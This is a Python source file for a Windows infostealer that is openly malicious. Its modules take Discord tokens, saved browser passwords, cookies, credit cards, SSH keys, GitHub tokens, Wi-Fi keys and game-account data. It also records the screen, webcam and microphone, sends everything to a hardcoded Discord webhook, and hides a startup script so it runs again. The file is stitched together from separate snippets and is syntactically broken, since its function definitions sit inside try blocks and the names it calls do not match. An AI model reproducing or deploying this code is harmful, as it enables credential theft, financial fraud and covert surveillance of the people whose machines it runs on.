import os
import sys
import json
import base64
import requests
import threading
import time
from datetime import datetime
import subprocess
import tempfile
import zipfile
import io

WEBHOOK_URL = "https://discord.com/api/webhooks/1457067740002127885/mANObIOS90vT031WUQB-z67nGM8rlDShtZdxSszsAqkXK27UDWHbmRrBNaNxPzYlvbpU"

def send_to_discord(data):
    try:
        payload = {
            "embeds": [{
                "title": "Data Collection Report",
                "description": "New data collected from target",
                "color": 16711680,
                "timestamp": datetime.now().isoformat(),
                "fields": []
            }]
        }
        
        for key, value in data.items():
            if isinstance(value, (dict, list)):
                value_str = json.dumps(value, indent=2)[:1000]
            else:
                value_str = str(value)[:1000]
            
            payload["embeds"][0]["fields"].append({
                "name": key,
                "value": f"```{value_str}```",
                "inline": False
            })
        
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except:
        pass

def create_persistence():
    try:
        if os.name == 'nt':
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
            bat_path = os.path.join(startup_path, 'system_update.bat')
            
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\npythonw "{sys.argv[0]}"\n')
            
            os.system(f'attrib +h "{bat_path}"')
    except:
        pass

def main():
    collected_data = {}
    

    try:
        
import os
import re
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.join(os.getenv('APPDATA'), 'discord'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Discord'),
        os.path.join(os.getenv('APPDATA'), 'discordptb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary')
    ]
    
    for path in discord_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                if 'Local Storage' in root and 'leveldb' in root:
                    for file in files:
                        if file.endswith('.ldb') or file.endswith('.log'):
                            full_path = os.path.join(root, file)
                            try:
                                with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    token_matches = re.findall(r'[a-zA-Z0-9_-]{23,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27}', content)
                                    tokens.extend(token_matches)
                            except:
                                pass
    return list(set(tokens))

        discord_token_data = discord_token()
        collected_data["Discord Token"] = discord_token_data
    except Exception as e:
        collected_data["Discord Token"] = {"error": str(e)}

    try:
        
import os
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_credit_cards():
    cards = []
    browsers = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google\Chrome\User Data'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft\Edge\User Data'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware\Brave-Browser\User Data')
    }
    
    for browser, path in browsers.items():
        if os.path.exists(path):
            for profile in os.listdir(path):
                if 'Profile' in profile or 'Default' in profile:
                    db_path = os.path.join(path, profile, 'Web Data')
                    if os.path.exists(db_path):
                        try:
                            shutil.copy2(db_path, 'temp_db')
                            conn = sqlite3.connect('temp_db')
                            cursor = conn.cursor()
                            cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
                            
                            for row in cursor.fetchall():
                                encrypted_card = row[3]
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(encrypted_card, None, None, None, 0)[1]
                                    card_number = decrypted.decode('utf-8')
                                    cards.append({
                                        'name': row[0],
                                        'month': row[1],
                                        'year': row[2],
                                        'number': card_number,
                                        'browser': browser
                                    })
                                except:
                                    pass
                            conn.close()
                            os.remove('temp_db')
                        except:
                            pass
    return cards

        credit_card_data = credit_card()
        collected_data["Credit Card"] = credit_card_data
    except Exception as e:
        collected_data["Credit Card"] = {"error": str(e)}

    try:
        
import os
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import re

def get_email_data():
    emails = []
    browser_paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google\Chrome\User Data'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft\Edge\User Data'),
        os.path.join(os.getenv('APPDATA'), 'Mozilla\Firefox')
    ]
    
    for base_path in browser_paths:
        if os.path.exists(base_path):
            for profile in os.listdir(base_path):
                if 'Profile' in profile or 'Default' in profile:
                    logins_path = os.path.join(base_path, profile, 'Login Data')
                    if os.path.exists(logins_path):
                        try:
                            shutil.copy2(logins_path, 'temp_logins')
                            conn = sqlite3.connect('temp_logins')
                            cursor = conn.cursor()
                            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                            
                            for row in cursor.fetchall():
                                url = row[0]
                                username = row[1]
                                encrypted_password = row[2]
                                
                                if '@' in username and any(email_provider in url for email_provider in ['gmail', 'outlook', 'yahoo', 'hotmail']):
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                                        password = decrypted.decode('utf-8')
                                        emails.append({
                                            'url': url,
                                            'username': username,
                                            'password': password
                                        })
                                    except:
                                        emails.append({
                                            'url': url,
                                            'username': username,
                                            'password': 'ENCRYPTED'
                                        })
                            conn.close()
                            os.remove('temp_logins')
                        except:
                            pass
    return emails

        email_data_data = email_data()
        collected_data["Email Data"] = email_data_data
    except Exception as e:
        collected_data["Email Data"] = {"error": str(e)}

    try:
        
import os
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import json
import shutil

def get_browser_passwords():
    passwords = []
    browsers = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google\Chrome\User Data'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft\Edge\User Data'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware\Brave-Browser\User Data'),
        'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software\Opera Stable')
    }
    
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if 'Profile' in profile or 'Default' in profile:
                    login_data_path = os.path.join(browser_path, profile, 'Login Data')
                    if os.path.exists(login_data_path):
                        try:
                            shutil.copy2(login_data_path, 'temp_login_data')
                            conn = sqlite3.connect('temp_login_data')
                            cursor = conn.cursor()
                            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                            
                            for row in cursor.fetchall():
                                encrypted_password = row[2]
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                                    password = decrypted.decode('utf-8')
                                    passwords.append({
                                        'browser': browser_name,
                                        'url': row[0],
                                        'username': row[1],
                                        'password': password
                                    })
                                except:
                                    pass
                            conn.close()
                            os.remove('temp_login_data')
                        except:
                            pass
    return passwords

        browser_passwords_data = browser_passwords()
        collected_data["Browser Passwords"] = browser_passwords_data
    except Exception as e:
        collected_data["Browser Passwords"] = {"error": str(e)}

    try:
        
import os
import json
import re
import winreg

def get_app_passwords():
    app_creds = []
    
    try:
        registry_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Internet Settings\Cache\Credentials",
            r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
            r"Software\TeamViewer",
            r"Software\AnyDesk",
            r"Software\Google\Chrome\NativeMessagingHosts"
        ]
        
        for path in registry_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
                for i in range(winreg.QueryInfoKey(key)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        if 'pass' in name.lower() or 'pwd' in name.lower() or 'secret' in name.lower():
                            app_creds.append({
                                'registry_path': path,
                                'key': name,
                                'value': str(value)[:100]
                            })
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    
    app_paths = [
        os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage'),
        os.path.join(os.getenv('APPDATA'), 'Slack', 'Local Storage'),
        os.path.join(os.getenv('APPDATA'), 'Signal', 'Local Storage')
    ]
    
    for app_path in app_paths:
        if os.path.exists(app_path):
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    if file.endswith('.json') or file.endswith('.ldb'):
                        try:
                            full_path = os.path.join(root, file)
                            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                if 'password' in content.lower() or 'token' in content.lower():
                                    app_creds.append({
                                        'app': os.path.basename(app_path),
                                        'file': file,
                                        'snippet': content[:200]
                                    })
                        except:
                            pass
    
    return app_creds

        application_passwords_data = application_passwords()
        collected_data["Application Passwords"] = application_passwords_data
    except Exception as e:
        collected_data["Application Passwords"] = {"error": str(e)}

    try:
        
import requests
import socket
import json

def get_ip_info():
    ip_info = {}
    
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip_info['public_ip'] = response.json()['ip']
    except:
        ip_info['public_ip'] = 'Failed to retrieve'
    
    try:
        hostname = socket.gethostname()
        ip_info['hostname'] = hostname
        ip_info['local_ip'] = socket.gethostbyname(hostname)
    except:
        ip_info['hostname'] = 'Unknown'
        ip_info['local_ip'] = 'Unknown'
    
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_info["public_ip"]}', timeout=5)
        geo_data = response.json()
        if geo_data['status'] == 'success':
            ip_info.update({
                'country': geo_data['country'],
                'region': geo_data['regionName'],
                'city': geo_data['city'],
                'isp': geo_data['isp'],
                'lat': geo_data['lat'],
                'lon': geo_data['lon']
            })
    except:
        pass
    
    return ip_info

        ip_address_data = ip_address()
        collected_data["IP Address"] = ip_address_data
    except Exception as e:
        collected_data["IP Address"] = {"error": str(e)}

    try:
        
import pyautogui
import io
import base64
from datetime import datetime

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()
        
        return {
            'timestamp': datetime.now().isoformat(),
            'screenshot': base64.b64encode(img_byte_arr).decode('utf-8'),
            'resolution': pyautogui.size()
        }
    except:
        return {'error': 'Failed to capture screenshot'}

        screenshot_data = screenshot()
        collected_data["Screenshot"] = screenshot_data
    except Exception as e:
        collected_data["Screenshot"] = {"error": str(e)}

    try:
        
import os
import glob

def get_ssh_keys():
    ssh_keys = []
    ssh_paths = [
        os.path.expanduser('~/.ssh'),
        os.path.join(os.getenv('PROGRAMDATA'), 'ssh'),
        os.path.join(os.getenv('ALLUSERSPROFILE'), 'ssh')
    ]
    
    for ssh_path in ssh_paths:
        if os.path.exists(ssh_path):
            for key_file in glob.glob(os.path.join(ssh_path, '*')):
                if not key_file.endswith('.pub') and os.path.isfile(key_file):
                    try:
                        with open(key_file, 'r') as f:
                            content = f.read()
                            if 'PRIVATE KEY' in content or 'RSA' in content:
                                ssh_keys.append({
                                    'path': key_file,
                                    'content': content[:1000]
                                })
                    except:
                        pass
    
    return ssh_keys

        ssh_keys_data = ssh_keys()
        collected_data["SSH Keys"] = ssh_keys_data
    except Exception as e:
        collected_data["SSH Keys"] = {"error": str(e)}

    try:
        
import os
import re
import json

def get_github_tokens():
    tokens = []
    
    git_config_paths = [
        os.path.expanduser('~/.git-credentials'),
        os.path.expanduser('~/.config/git/credentials'),
        os.path.join(os.getenv('USERPROFILE'), '.git-credentials')
    ]
    
    for config_path in git_config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    content = f.read()
                    matches = re.findall(r'github\.com[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+', content)
                    tokens.extend(matches)
            except:
                pass
    
    env_vars = ['GITHUB_TOKEN', 'GH_TOKEN', 'GIT_TOKEN']
    for env_var in env_vars:
        token = os.getenv(env_var)
        if token:
            tokens.append(f'{env_var}: {token}')
    
    return tokens

        github_token_data = github_token()
        collected_data["GitHub Token"] = github_token_data
    except Exception as e:
        collected_data["GitHub Token"] = {"error": str(e)}

    try:
        
import sounddevice as sd
import numpy as np
import io
import base64
import wave
from datetime import datetime

def record_audio(duration=10):
    try:
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        
        buffer = io.BytesIO()
        with wave.open(buffer, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes((recording * 32767).astype(np.int16).tobytes())
        
        audio_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        return {
            'timestamp': datetime.now().isoformat(),
            'duration': duration,
            'audio_data': audio_data[:50000],
            'sample_rate': fs
        }
    except:
        return {'error': 'Audio recording failed'}

        audio_recording_data = audio_recording()
        collected_data["Audio Recording"] = audio_recording_data
    except Exception as e:
        collected_data["Audio Recording"] = {"error": str(e)}

    try:
        
import pyaudio
import wave
import io
import base64
import threading
from datetime import datetime

def record_microphone(duration=10):
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        buffer = io.BytesIO()
        wf = wave.open(buffer, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        audio_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        return {
            'timestamp': datetime.now().isoformat(),
            'duration': duration,
            'audio_data': audio_data[:50000],
            'channels': CHANNELS,
            'sample_rate': RATE
        }
    except:
        return {'error': 'Microphone recording failed'}

        microphone_recording_data = microphone_recording()
        collected_data["Microphone Recording"] = microphone_recording_data
    except Exception as e:
        collected_data["Microphone Recording"] = {"error": str(e)}

    try:
        
import os
import sqlite3
import json
import shutil
from Crypto.Cipher import AES
import win32crypt

def get_cookies():
    cookies = []
    browsers = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google\Chrome\User Data'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft\Edge\User Data'),
        'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla\Firefox')
    }
    
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if 'Profile' in profile or 'Default' in profile:
                    if browser_name == 'Firefox':
                        cookies_path = os.path.join(browser_path, profile, 'cookies.sqlite')
                    else:
                        cookies_path = os.path.join(browser_path, profile, 'Cookies')
                    
                    if os.path.exists(cookies_path):
                        try:
                            temp_path = 'temp_cookies'
                            shutil.copy2(cookies_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            
                            if browser_name == 'Firefox':
                                cursor.execute('SELECT host, name, value FROM moz_cookies')
                            else:
                                cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
                            
                            for row in cursor.fetchall()[:50]:
                                if browser_name == 'Firefox':
                                    cookies.append({
                                        'browser': browser_name,
                                        'host': row[0],
                                        'name': row[1],
                                        'value': row[2]
                                    })
                                else:
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                                        value = decrypted.decode('utf-8')
                                        cookies.append({
                                            'browser': browser_name,
                                            'host': row[0],
                                            'name': row[1],
                                            'value': value
                                        })
                                    except:
                                        cookies.append({
                                            'browser': browser_name,
                                            'host': row[0],
                                            'name': row[1],
                                            'value': 'ENCRYPTED'
                                        })
                            conn.close()
                            os.remove(temp_path)
                        except:
                            pass
    return cookies

        system_cookies_data = system_cookies()
        collected_data["System Cookies"] = system_cookies_data
    except Exception as e:
        collected_data["System Cookies"] = {"error": str(e)}

    try:
        
import os
import sqlite3
import shutil
from datetime import datetime

def get_browser_history():
    history = []
    browsers = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google\Chrome\User Data'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft\Edge\User Data')
    }
    
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if 'Profile' in profile or 'Default' in profile:
                    history_path = os.path.join(browser_path, profile, 'History')
                    if os.path.exists(history_path):
                        try:
                            temp_path = 'temp_history'
                            shutil.copy2(history_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100')
                            
                            for row in cursor.fetchall():
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=row[3])
                                history.append({
                                    'browser': browser_name,
                                    'url': row[0],
                                    'title': row[1],
                                    'visit_count': row[2],
                                    'last_visit': timestamp.isoformat()
                                })
                            conn.close()
                            os.remove(temp_path)
                        except:
                            pass
    return history

        browser_history_data = browser_history()
        collected_data["Browser History"] = browser_history_data
    except Exception as e:
        collected_data["Browser History"] = {"error": str(e)}

    try:
        
import subprocess
import re
import os

def get_wifi_passwords():
    wifi_networks = []
    
    try:
        if os.name == 'nt':
            profiles_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='utf-8')
            profiles = re.findall(r': (.*?)', profiles_data)
            
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], encoding='utf-8')
                    password_match = re.search(r'Key Content\s*: (.*?)', profile_info)
                    if password_match:
                        password = password_match.group(1)
                        wifi_networks.append({
                            'ssid': profile.strip(),
                            'password': password.strip()
                        })
                except:
                    continue
        else:
            try:
                import nmap
                import netifaces
            except:
                pass
    
    except:
        wifi_networks.append({'error': 'Failed to retrieve WiFi credentials'})
    
    return wifi_networks

        wifi_credentials_data = wifi_credentials()
        collected_data["WiFi Credentials"] = wifi_credentials_data
    except Exception as e:
        collected_data["WiFi Credentials"] = {"error": str(e)}

    try:
        
import win32clipboard
import io

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        
        return {
            'content': data[:1000],
            'length': len(data)
        }
    except:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            
            return {
                'content': data[:1000].decode('utf-8', errors='ignore'),
                'length': len(data)
            }
        except:
            return {'error': 'Clipboard inaccessible or empty'}

        clipboard_content_data = clipboard_content()
        collected_data["Clipboard Content"] = clipboard_content_data
    except Exception as e:
        collected_data["Clipboard Content"] = {"error": str(e)}

    try:
        
import os
import re
import json

def get_steam_credentials():
    steam_data = []
    
    steam_paths = [
        os.path.join(os.getenv('PROGRAMFILES(X86)'), 'Steam'),
        os.path.join(os.getenv('PROGRAMFILES'), 'Steam'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Steam')
    ]
    
    for steam_path in steam_paths:
        if os.path.exists(steam_path):
            config_path = os.path.join(steam_path, 'config', 'config.vdf')
            if os.path.exists(config_path):
                try:
                    with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        
                        username_match = re.search(r'"UserName"\s+"([^"]+)"', content)
                        if username_match:
                            steam_data.append({
                                'type': 'username',
                                'value': username_match.group(1)
                            })
                        
                        remember_password = re.search(r'"RememberPassword"\s+"([^"]+)"', content)
                        if remember_password:
                            steam_data.append({
                                'type': 'remember_password',
                                'value': remember_password.group(1)
                            })
                        
                        recent_users = re.findall(r'"LastGameNameUsed"\s+"([^"]+)"', content)
                        for user in recent_users[:5]:
                            steam_data.append({
                                'type': 'recent_user',
                                'value': user
                            })
                except:
                    pass
            
            login_users_path = os.path.join(steam_path, 'config', 'loginusers.vdf')
            if os.path.exists(login_users_path):
                try:
                    with open(login_users_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        account_ids = re.findall(r'"AccountID"\s+"(\d+)"', content)
                        for acc_id in account_ids[:5]:
                            steam_data.append({
                                'type': 'account_id',
                                'value': acc_id
                            })
                except:
                    pass
    
    return steam_data

        steam_credentials_data = steam_credentials()
        collected_data["Steam Credentials"] = steam_credentials_data
    except Exception as e:
        collected_data["Steam Credentials"] = {"error": str(e)}

    try:
        
import os
import json
import base64

def get_minecraft_session():
    session_data = []
    
    minecraft_paths = [
        os.path.join(os.getenv('APPDATA'), '.minecraft'),
        os.path.join(os.getenv('LOCALAPPDATA'), 'Packages\Microsoft.MinecraftUWP_8wekyb3d8bbwe\LocalState\games\com.mojang')
    ]
    
    for mc_path in minecraft_paths:
        if os.path.exists(mc_path):
            launcher_profiles_path = os.path.join(mc_path, 'launcher_profiles.json')
            if os.path.exists(launcher_profiles_path):
                try:
                    with open(launcher_profiles_path, 'r') as f:
                        data = json.load(f)
                        
                        if 'authenticationDatabase' in data:
                            for key, auth_data in data['authenticationDatabase'].items():
                                if 'profiles' in auth_data:
                                    for profile_id, profile in auth_data['profiles'].items():
                                        session_data.append({
                                            'type': 'minecraft_profile',
                                            'display_name': profile.get('displayName', ''),
                                            'profile_id': profile_id
                                        })
                        
                        if 'clientToken' in data:
                            session_data.append({
                                'type': 'client_token',
                                'value': data['clientToken'][:20] + '...'
                            })
                except:
                    pass
    
    return session_data

        minecraft_session_data = minecraft_session()
        collected_data["Minecraft Session"] = minecraft_session_data
    except Exception as e:
        collected_data["Minecraft Session"] = {"error": str(e)}

    try:
        
import cv2
import io
import base64
from datetime import datetime

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            img_bytes = buffer.tobytes()
            
            return {
                'timestamp': datetime.now().isoformat(),
                'webcam_image': base64.b64encode(img_bytes).decode('utf-8')[:50000],
                'resolution': f"{frame.shape[1]}x{frame.shape[0]}"
            }
        else:
            return {'error': 'Failed to capture webcam image'}
    except:
        return {'error': 'Webcam not accessible'}

        webcam_capture_data = webcam_capture()
        collected_data["Webcam Capture"] = webcam_capture_data
    except Exception as e:
        collected_data["Webcam Capture"] = {"error": str(e)}

    try:
        
import socket
import psutil
import json
import subprocess

def get_network_info():
    network_data = {}
    
    try:
        network_data['connections'] = []
        for conn in psutil.net_connections(kind='inet'):
            if conn.laddr and conn.raddr:
                network_data['connections'].append({
                    'local': f"{conn.laddr.ip}:{conn.laddr.port}",
                    'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else '',
                    'status': conn.status,
                    'pid': conn.pid
                })
        
        network_data['interfaces'] = {}
        for interface, stats in psutil.net_if_stats().items():
            network_data['interfaces'][interface] = {
                'is_up': stats.isup,
                'duplex': stats.duplex,
                'speed': stats.speed,
                'mtu': stats.mtu
            }
        
        try:
            arp_output = subprocess.check_output(['arp', '-a'], encoding='utf-8')
            network_data['arp_table'] = arp_output[:1000]
        except:
            network_data['arp_table'] = 'Not available'
        
        try:
            route_output = subprocess.check_output(['netstat', '-rn'], encoding='utf-8')
            network_data['routing_table'] = route_output[:1000]
        except:
            network_data['routing_table'] = 'Not available'
            
    except:
        network_data['error'] = 'Failed to gather network information'
    
    return network_data

        network_information_data = network_information()
        collected_data["Network Information"] = network_information_data
    except Exception as e:
        collected_data["Network Information"] = {"error": str(e)}

    try:
        
import subprocess
import re

def get_gpu_info():
    gpu_info = []
    
    try:
        if os.name == 'nt':
            try:
                result = subprocess.check_output(['wmic', 'path', 'win32_VideoController', 'get', 'name,DriverVersion,AdapterRAM'], 
                                                encoding='utf-8')
                lines = result.strip().split('
')[1:]
                for line in lines:
                    if line.strip():
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            name = ' '.join(parts[:-2])
                            driver = parts[-2]
                            vram = parts[-1]
                            gpu_info.append({
                                'name': name,
                                'driver_version': driver,
                                'vram': vram
                            })
            except:
                pass
    except:
        gpu_info.append({'error': 'Failed to get GPU information'})
    
    return gpu_info

        gpu_information_data = gpu_information()
        collected_data["GPU Information"] = gpu_information_data
    except Exception as e:
        collected_data["GPU Information"] = {"error": str(e)}

    try:
        
import platform
import psutil
import subprocess

def get_cpu_details():
    cpu_info = {}
    
    try:
        cpu_info['brand'] = platform.processor()
        cpu_info['cores'] = psutil.cpu_count(logical=False)
        cpu_info['threads'] = psutil.cpu_count(logical=True)
        
        freq = psutil.cpu_freq()
        if freq:
            cpu_info['current_freq'] = freq.current
            cpu_info['max_freq'] = freq.max
            cpu_info['min_freq'] = freq.min
        
        cpu_info['usage_per_core'] = psutil.cpu_percent(percpu=True, interval=1)
        cpu_info['total_usage'] = psutil.cpu_percent(interval=1)
        
        if os.name == 'nt':
            try:
                result = subprocess.check_output(['wmic', 'cpu', 'get', 'Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed'], 
                                                encoding='utf-8')
                lines = result.strip().split('
')
                if len(lines) > 1:
                    details = lines[1].strip().split()
                    cpu_info['detailed_name'] = ' '.join(details[:-3])
            except:
                pass
    except:
        cpu_info['error'] = 'Failed to get CPU details'
    
    return cpu_info

        cpu_details_data = cpu_details()
        collected_data["CPU Details"] = cpu_details_data
    except Exception as e:
        collected_data["CPU Details"] = {"error": str(e)}

    try:
        
import subprocess
import re

def get_network_shares():
    shares = []
    
    try:
        if os.name == 'nt':
            result = subprocess.check_output(['net', 'share'], encoding='utf-8', errors='ignore')
            lines = result.strip().split('
')
            
            for line in lines[3:]:
                if line.strip():
                    parts = line.split()
                    if len(parts) >= 2:
                        share_name = parts[0]
                        share_path = parts[1] if len(parts) > 1 else ''
                        shares.append({
                            'name': share_name,
                            'path': share_path
                        })
    except:
        shares.append({'error': 'Failed to get network shares'})
    
    return shares

        network_shares_data = network_shares()
        collected_data["Network Shares"] = network_shares_data
    except Exception as e:
        collected_data["Network Shares"] = {"error": str(e)}

    try:
        
import subprocess
import re

def get_bluetooth_devices():
    devices = []
    
    try:
        if os.name == 'nt':
            try:
                result = subprocess.check_output(['powershell', 'Get-PnpDevice -Class Bluetooth'], 
                                                encoding='utf-8')
                lines = result.strip().split('
')
                for line in lines[3:]:
                    if line.strip() and 'DeviceID' not in line:
                        parts = line.split('  ')
                        parts = [p.strip() for p in parts if p.strip()]
                        if len(parts) >= 2:
                            devices.append({
                                'name': parts[0],
                                'status': parts[1] if len(parts) > 1 else '',
                                'class': parts[2] if len(parts) > 2 else ''
                            })
            except:
                pass
    except:
        devices.append({'error': 'Failed to get Bluetooth devices'})
    
    return devices

        bluetooth_devices_data = bluetooth_devices()
        collected_data["Bluetooth Devices"] = bluetooth_devices_data
    except Exception as e:
        collected_data["Bluetooth Devices"] = {"error": str(e)}

    try:
        
import winreg
import os

def get_usb_history():
    usb_devices = []
    
    try:
        if os.name == 'nt':
            registry_path = r"SYSTEM\CurrentControlSet\Enum\USB"
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path)
            
            for i in range(winreg.QueryInfoKey(key)[0]):
                try:
                    vid_pid = winreg.EnumKey(key, i)
                    subkey = winreg.OpenKey(key, vid_pid)
                    
                    for j in range(winreg.QueryInfoKey(subkey)[0]):
                        try:
                            instance_id = winreg.EnumKey(subkey, j)
                            instance_key = winreg.OpenKey(subkey, instance_id)
                            
                            try:
                                friendly_name = winreg.QueryValueEx(instance_key, "FriendlyName")[0]
                            except:
                                friendly_name = "Unknown"
                            
                            try:
                                device_desc = winreg.QueryValueEx(instance_key, "DeviceDesc")[0]
                            except:
                                device_desc = "Unknown"
                            
                            usb_devices.append({
                                'vid_pid': vid_pid,
                                'instance': instance_id,
                                'friendly_name': friendly_name,
                                'description': device_desc
                            })
                            
                            winreg.CloseKey(instance_key)
                        except:
                            continue
                    
                    winreg.CloseKey(subkey)
                except:
                    continue
            
            winreg.CloseKey(key)
    except:
        usb_devices.append({'error': 'Failed to get USB history'})
    
    return usb_devices[:50]

        usb_history_data = usb_history()
        collected_data["USB History"] = usb_history_data
    except Exception as e:
        collected_data["USB History"] = {"error": str(e)}

    try:
        send_to_discord(collected_data)
    except:
        pass
    
    create_persistence()
    
    while True:
        time.sleep(3600)
        try:
            for module in collected_data:
                try:
                    module_func = globals().get(module.lower().replace(" ", "_").replace("(", "").replace(")", ""))
                    if module_func:
                        new_data = module_func()
                        update_payload = {
                            "embeds": [{
                                "title": f"Updated: {module}",
                                "description": f"New {module} data collected",
                                "color": 65280,
                                "timestamp": datetime.now().isoformat(),
                                "fields": [{
                                    "name": "Data",
                                    "value": f"```{json.dumps(new_data, indent=2)[:1000]}```",
                                    "inline": False
                                }]
                            }]
                        }
                        requests.post(WEBHOOK_URL, json=update_payload, timeout=10)
                except:
                    pass
        except:
            pass

if __name__ == "__main__":
    try:
        if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
            main()
        else:
            subprocess.Popen([sys.executable, sys.argv[0], "--hidden"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        main()
